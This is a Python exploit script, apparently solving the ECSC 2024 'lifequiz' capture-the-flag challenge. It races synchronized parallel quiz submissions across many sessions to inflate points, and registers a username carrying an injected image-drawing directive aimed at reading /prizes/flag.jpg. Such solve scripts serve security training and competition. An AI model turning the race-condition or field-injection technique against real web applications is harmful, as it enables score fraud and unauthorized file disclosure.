import requests
from pwn import *

# I have cloned the requests_racer repo from github
# Followed the instructions in the README.md to install the library
# and have the folder inside the current directory of this script
from requests_racer import SynchronizedAdapter

# See documentation of the library to understand how to use it
sync = SynchronizedAdapter()

# Taken from source code
answers = [
    ['42', 'There is no meaning', 'To be happy', 'To help others'],
    ['To express emotions', 'To make money', 'To make people think', 'To make people happy'],
    ['To be free', 'To be rich', 'To be healthy', 'To be happy'],
    ['Yes', 'No', 'Maybe', 'I don''t know'],
    ['In the city', 'In the country', 'In the mountains', 'In the beach']
]

username = "\"image src 0,0 0,0 \"/prizes/flag.jpg"
email = "verycoolwithoutatemaildotcom"
password = None

login_path = '/login.php'
register_path = login_path
quiz_path = '/quiz.php'
reset_path = '/reset.php'
prize_path = '/get_prize.php'

is_remote = False
if args.REMOTE:
    is_remote = True
    url = 'http://lifequiz.challs.open.ecsc2024.it/'
else:
    url = 'http://localhost:8000'

# solved with THREADS=100
no_of_sessions = 4 if args.THREADS == '' else int(args.THREADS)
sessions = []
points = 0
index = 0

def mount_sessions():
    global sessions
    global no_of_sessions
    global sync
    for i in range(no_of_sessions):
        s = sessions[i]
        s.mount('http://', sync)
        s.mount('https://', sync)

def init_sessions():
    global sessions
    sessions = []
    for i in range(no_of_sessions):
        s = requests.Session()
        session_cookie = 'veryverysecretsessionid' + str(i)
        s.cookies.set('PHPSESSID', session_cookie)
        sessions.append(s)

def get_password():
    # get password from file password.txt
    if is_remote:
        filename = f'remote-password.txt'
    else:
        filename = f'local-password.txt'
    with open(filename, 'r') as f:
        return f.read().strip()
    
def set_password(p):
    global password
    # save password to file password.txt
    if is_remote:
        filename = f'remote-password.txt'
    else:
        filename = f'local-password.txt'
    with open(filename, 'w') as f:
        f.write(p)
        password = p

def register(i):
    global sessions
    global username
    global email
    s = sessions[i]
    if s == None:
        print('No session')
        raise Exception('No session')
    data = {
        'username': username,
        'email': email
    }
    r = s.post(url + register_path, data=data)
    if r.status_code != 200:
        print(r.status_code)
        print(r.text)
        return
    
    # find password in <div class='alert alert-success'>User created! Your password is \"$password\"</div>
    t = r.text
    if 'Email already registered' in t:
        print('Email already registered')
    if 'alert alert-success' not in t:
        print('No alert success')
        print(t)
        return
    t = t.split('alert alert-success')[1]
    t = t.split('Your password is')[1]
    t = t.split('</div>')[0]
    password = t.split('"')[1]
    print('Password is ' + password)
    set_password(password)
    return password

def login(i, email = email, password = password):
    global sessions
    s = sessions[i]
    if s == None:
        print('No session')
        raise Exception('No session')
    
    data = {
        'email': email,
        'password': password
    }
    r = s.post(url + login_path, data=data)

    if r.status_code != 200:
        print(r.status_code)
        print(r.text)
        return
    
    # print(r.text)

def authenticate(index = None):
    global password
    global email
    if index != None:
        # authenticate single session
        try:
            password = get_password()
        except:
            register(index)
        finally:
            login(index)
    else:
        # authenticate all sessions
        try:
            password = get_password()
        except:
            password = register(0)
        finally:
            for i in range(no_of_sessions):
                login(i, email=email, password=password)

def reset(i):
    global sessions
    global index
    s = sessions[i]
    r = s.get(url + reset_path)
    if r.status_code != 200:
        print(r.status_code)
        print(r.text)
        return
    index = 0
    print(f'[s{i}] Reset done')

def make_get_points(i):
    global sessions
    s = sessions[i]
    r = s.get(url + prize_path)
    return r

def handler_get_points(r, i):
    global points
    t = r.text
    if 'You have' in t:
        points = t.split('You have ')[1].split(' points')[0]
        # print(f'Points: {points}')
        return int(points)
    elif 'Error getting your prize' in t:
        print('Error in getting PRIZE')
        return 15
    elif 'Your prize is ready, ' in t:
        print('Your prize is ready')
        return 15
    else:
        print('Error while getting points')
        print(t)
        raise Exception('Error while getting points')
    
def make_answer_quiz(answer, i):
    global sessions
    s = sessions[i]
    data = {
        'answer': answer
    }
    r = s.post(url + quiz_path, data=data)
    return r

def handler_answer_quiz(r, i, answer):
    global answers
    global index
    t = r.text
    if 'Correct' in t:
        # Get questio number from <h3 class='mb-3'>Question 5</h3>
        question = t.split('Question ')[1].split('</h3>')[0]
        print(f'[s{i}][+1] Correct [question no. {question}] {answer}')
    elif 'Incorrect' in t:
        # Get questio number from <h3 class='mb-3'>Question 5</h3>
        question = t.split('Question ')[1].split('</h3>')[0]
        print(f'[s{i}][0] Incorrect [question no. {question}] {answer}')
        correct_answer = t.split('The correct answer was: ')[1].split('</p>')[0]
        print(f'Correct answer: {correct_answer}')


    elif 'No question found' in t:
        print(f'[s{i}][?] No question found')
    elif 'You answered all the questions' in t:
        print(f'[s{i}][X] You have already answered all questions')
    elif 'Congratulations' in t:
        print(f'[s{i}][!] Congratulations')
    else:
        print(t)

def make_get_current_index(i):
    global sessions
    s = sessions[i]
    r = s.get(url + quiz_path)
    return r

def handler_get_current_index(r, i):
    t = r.text
    if 'Question' in t:
        question = t.split('Question ')[1].split('</h3>')[0]
        q = int(question)
        return (q-1) % 5, q # 5 questions per round
    else:
        print('No question found')
        raise Exception('No question found') 

def make_get_session_cookie(i):
    r = make_get_points(i)
    return r

def handler_get_session_cookie(r, i):
    global points
    global sessions
    points = handler_get_points(r, i)
    print(f"[{points}pts] session[{i}] = {sessions[i].cookies}")

def solve_quiz():
    global answers
    global index
    global sync
    global points
    mount_sessions()
    # for all rounds (3)
    for i in range(3):
        # for all sets of answers (5)
        for k in range(len(answers)):
            r = make_get_points(0)
            sync.finish_all()
            points = handler_get_points(r, 0)
            if points >= 15:
                print('Already won')
                return
            else:
                print(f'Points: {points}')
        
            sleep(1)
            r = make_get_current_index(0)
            sync.finish_all()
            [index, count] = handler_get_current_index(r, 0)
            print(f'Current index/count: {index}/{count}')

            responses = [None]*no_of_sessions
            actual_answers = [None]*no_of_sessions
            # for each answer, make multiple requests in parallel in different sessions
            for j in range(no_of_sessions):
                round_answers = answers[index]
                answer = round_answers[(i+2)%len(round_answers)]
                actual_answers[j] = answer
                responses[j] = make_answer_quiz(answer, j)

            sync.finish_all()

            for j in range(no_of_sessions):
                a = actual_answers[j]
                r = responses[j]
                handler_answer_quiz(r, j, a)


            index = (index + 1) % len(answers)
            count = k+1+i*len(answers)

def exploit():
    global points
    global sync
    random_sleep = 30 # default 30s
    init_sessions()
    print("initiated sessions")
    authenticate()
    res = input("Reset points?")
    if res.lower() == 'y':
        reset(0)
        print('Reset done')
    else:
        print('No reset')
    try:
        while points < 15:
            try:
                # resetting points
                solve_quiz()
            except Exception as e:
                print(e)
                reset(0)
                random_sleep = random.random()*60
            finally:
                if points < 15:
                    # slowing down the requests to not ddos the server
                    print(f'Sleeping for {random_sleep:.2f} seconds')
                    time.sleep(random_sleep)
        
        print('Won')
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(e)
    finally:
        print('Exiting...')
    r = make_get_session_cookie(0)
    sync.finish_all()
    # print session cookie
    handler_get_session_cookie(r, 0)

if __name__ == '__main__':
    exploit()
